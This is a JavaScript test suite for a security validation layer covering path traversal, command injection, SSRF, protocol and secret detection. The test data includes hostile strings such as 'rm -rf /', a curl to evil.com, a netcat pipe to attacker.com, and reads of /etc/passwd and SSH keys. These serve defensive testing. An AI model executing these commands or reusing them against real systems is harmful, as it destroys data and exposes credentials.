const assert = require('assert');
const { AuditLayer } = require('../../core/pipeline/audit');
const { PathValidator, NetworkValidator, CommandValidator, EntropyValidator } = require('../../core/validators');
const path = require('path');
const os = require('os');

console.log('🧪 Testing NIST SI-10 Security Validation...\n');

// Test manifest
const testManifest = {
    filesystem: {
        read: ['**/*'],
        write: ['**/*']
    },
    network: {
        allowlist: ['https://api.github.com']
    },
    git: {
        read: true,
        write: false
    }
};

// Test 1: Path traversal detection (../)
console.log('▶ Test 1: Path traversal attack detection (..)');
const pathValidator = new PathValidator({
    rootDirectory: process.cwd(),
    allowedPatterns: testManifest.filesystem.read
});

const result1 = pathValidator.hasDirectoryTraversal('../../../etc/passwd');
assert.strictEqual(result1, true, 'Path traversal should be detected');
console.log('✅ Path traversal with .. detected\n');

// Test 2: More complex path traversal
console.log('▶ Test 2: Complex path traversal patterns');
const traversalPatterns = [
    '../config/secrets.txt',
    '../../.ssh/id_rsa',
    'docs/../../../etc/hosts',
    './test/../../sensitive.key'
];

for (const pattern of traversalPatterns) {
    const hasTraversal = pathValidator.hasDirectoryTraversal(pattern);
    assert.strictEqual(hasTraversal, true, `Should detect traversal in: ${pattern}`);
}
console.log('✅ All path traversal patterns blocked\n');

// Test 3: Command injection detection (shell operators)
console.log('▶ Test 3: Command injection detection');
const injectionCommands = [
    'ls && cat /etc/passwd',
    'git status || rm -rf /',
    'node app.js; curl http://evil.com',
    'npm install | nc attacker.com 4444'
];

const cmdValidator = new CommandValidator();

for (const cmd of injectionCommands) {
    const hasInjection = cmdValidator.hasInjectionAttempt(cmd);
    assert.strictEqual(hasInjection, true, `Should detect injection in: ${cmd}`);
}
console.log('✅ All command injection attempts blocked\n');

// Test 4: SSRF (Server-Side Request Forgery) - localhost access
console.log('▶ Test 4: SSRF attempt detection (localhost)');
const networkValidator = new NetworkValidator({
    allowedSchemes: ['https', 'http'],
    allowLocalhostIPs: false
});

const ssrfCheck1 = networkValidator.isSSRFAttempt('localhost');
assert.strictEqual(ssrfCheck1.isSSRF, true, 'Should detect localhost as SSRF');
console.log('✅ Localhost access flagged\n');

// Test 5: SSRF - 127.0.0.1 access
console.log('▶ Test 5: SSRF attempt with 127.0.0.1');
const ssrfCheck2 = networkValidator.isSSRFAttempt('127.0.0.1');
assert.strictEqual(ssrfCheck2.isSSRF, true, 'Should detect 127.0.0.1 as SSRF');
console.log('✅ 127.0.0.1 access flagged\n');

// Test 6: Invalid protocol blocking
console.log('▶ Test 6: Invalid protocol blocking');
const invalidProtocols = [
    'file:///etc/passwd',
    'ftp://internal.server/data',
    'gopher://legacy.system'
];

for (const url of invalidProtocols) {
    const result = networkValidator.validateURL(url);
    assert.strictEqual(result.valid, false, `Should block protocol: ${url}`);
}
console.log('✅ Invalid protocols blocked\n');

// Test 7: Secret detection in parameters
console.log('▶ Test 7: AWS key detection');
const entropyValidator = new EntropyValidator();
const awsKeyContent = 'Authorization: AWS AKIA1234567890ABCDEF';
const awsResult = entropyValidator.scanContent(awsKeyContent);
assert.strictEqual(awsResult.hasSecrets, true, 'Should detect AWS key');
console.log('✅ AWS key detected\n');

// Test 8: Private key detection
console.log('▶ Test 8: Private key detection');
const privateKeyContent = '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQ...';
const privateKeyResult = entropyValidator.scanContent(privateKeyContent);
assert.strictEqual(privateKeyResult.hasSecrets, true, 'Should detect private key');
console.log('✅ Private key detected\n');

// Test 9: Entropy scanner for high-entropy secrets
console.log('▶ Test 9: Entropy scanner for high-entropy data');
const highEntropyStrings = [
    'sk_test_FAKEKEYFORTESTING000000000000000',
    'ghp_1234567890abcdefghijklmnopqrstuvwxyz',
    'xoxb-000000000000-000000000000-XXXXXXXXXXXXXXXXXXXXXXXX'
];

for (const secret of highEntropyStrings) {
    const scan = entropyValidator.scanContent(secret);
    assert.strictEqual(scan.hasSecrets, true, `Should detect high entropy in: ${secret}`);
    assert.ok(scan.secrets.length > 0, 'Should have findings');
}
console.log('✅ High-entropy secrets detected\n');

// Test 10: Entropy calculation validation
console.log('▶ Test 10: Shannon entropy calculation');
const lowEntropyString = 'aaaaaaaaaa';
const highEntropyString = 'aB3$xZ9#pQ';

const lowEntropy = entropyValidator.calculateShannonEntropy(lowEntropyString);
const highEntropy = entropyValidator.calculateShannonEntropy(highEntropyString);

assert.ok(lowEntropy < 2, `Low entropy should be < 2, got ${lowEntropy}`);
assert.ok(highEntropy > 3, `High entropy should be > 3, got ${highEntropy}`);
console.log(`✅ Entropy calculation correct (low: ${lowEntropy.toFixed(2)}, high: ${highEntropy.toFixed(2)})\n`);

// Test 11: Valid filesystem operations should pass
console.log('▶ Test 11: Valid filesystem operations pass validation');
const validFsResult = PathValidator.validateFromManifest('src/app.js', testManifest.filesystem.read, process.cwd());
assert.strictEqual(validFsResult.allowed, true, 'Valid filesystem operation should pass');
console.log('✅ Valid filesystem operation passed\n');

// Test 12: Valid network request should pass
console.log('▶ Test 12: Valid network request passes validation');
const validNetResult = NetworkValidator.validateFromManifest(
    'https://api.github.com/repos',
    testManifest.network
);
assert.strictEqual(validNetResult.valid, true, 'Valid network request should pass');
console.log('✅ Valid network request passed\n');

// Test 13: Valid process command should pass
console.log('▶ Test 13: Valid process command passes validation');
const validProcessResult = CommandValidator.validateFromManifest('git', ['status'], testManifest);
assert.strictEqual(validProcessResult.valid, true, 'Valid process command should pass');
console.log('✅ Valid process command passed\n');

// Test 14: AuditLayer integration
console.log('▶ Test 14: AuditLayer with manifest capabilities');
const auditLayer = new AuditLayer(path.join(os.tmpdir(), 'ghost-nist-test.log'), testManifest);

const validIntent = {
    type: 'filesystem',
    operation: 'read',
    params: { path: 'test.txt' },
    extensionId: 'test-ext',
    requestId: 'req-1'
};

const authResult = { authorized: true, code: 'OK' };
const auditResult = auditLayer.audit(validIntent, authResult);
assert.strictEqual(auditResult.passed, true, 'Valid intent should pass');
console.log('✅ AuditLayer integration works\n');

// Test 15: Multiple violations in single intent
console.log('▶ Test 15: Multiple violations detection');
const multiViolationIntent = {
    type: 'filesystem',
    operation: 'write',
    params: {
        path: '../../../secrets.txt',
        content: 'AKIA1234567890ABCDEF'
    },
    extensionId: 'bad-ext',
    requestId: 'req-2'
};

const multiViolationResult = auditLayer.audit(multiViolationIntent, authResult);
assert.strictEqual(multiViolationResult.passed, false, 'Should fail validation');
assert.ok(multiViolationResult.violations.length >= 1, 'Should detect violations');
console.log('✅ Multiple violations detected\n');

// Test 16: Edge cases - empty and null inputs
console.log('▶ Test 16: Edge cases (empty/null inputs)');
const emptyPathIntent = {
    type: 'filesystem',
    operation: 'read',
    params: { path: '' },
    extensionId: 'test-ext',
    requestId: 'req-3'
};
const emptyResult = auditLayer.audit(emptyPathIntent, authResult);
assert.strictEqual(emptyResult.passed, false, 'Empty path should fail');

const nullPathIntent = {
    type: 'filesystem',
    operation: 'read',
    params: { path: null },
    extensionId: 'test-ext',
    requestId: 'req-4'
};
const nullResult = auditLayer.audit(nullPathIntent, authResult);
assert.strictEqual(nullResult.passed, false, 'Null path should fail');
console.log('✅ Edge cases handled\n');

// Test 17: Invalid URL detection
console.log('▶ Test 17: Invalid URL detection');
const invalidUrlIntent = {
    type: 'network',
    operation: 'https',
    params: { url: 'not-a-valid-url' },
    extensionId: 'test-ext',
    requestId: 'req-5'
};

const invalidUrlResult = auditLayer.audit(invalidUrlIntent, authResult);
assert.strictEqual(invalidUrlResult.passed, false, 'Invalid URL should fail');
assert.ok(
    invalidUrlResult.violations.some(v => v.rule === 'SI-10-URL-VALIDATION'),
    'Should detect invalid URL'
);
console.log('✅ Invalid URL detected\n');

// Test 18: Security event logging with structured fields
console.log('▶ Test 18: Security event logging');
const logs = auditLayer.getLogs({ limit: 100 });
const securityEvents = logs.filter(l => l.type === 'SECURITY_EVENT');

assert.ok(securityEvents.length > 0, 'Should have security events logged');

const recentEvent = securityEvents[securityEvents.length - 1];
assert.ok(recentEvent.extensionId, 'Security event should have extensionId');
assert.ok(recentEvent.severity, 'Security event should have severity');
assert.ok(recentEvent.rule, 'Security event should have rule');

console.log('✅ Security events logged with structured fields\n');

console.log('🎉 All NIST SI-10 security validation tests passed!');
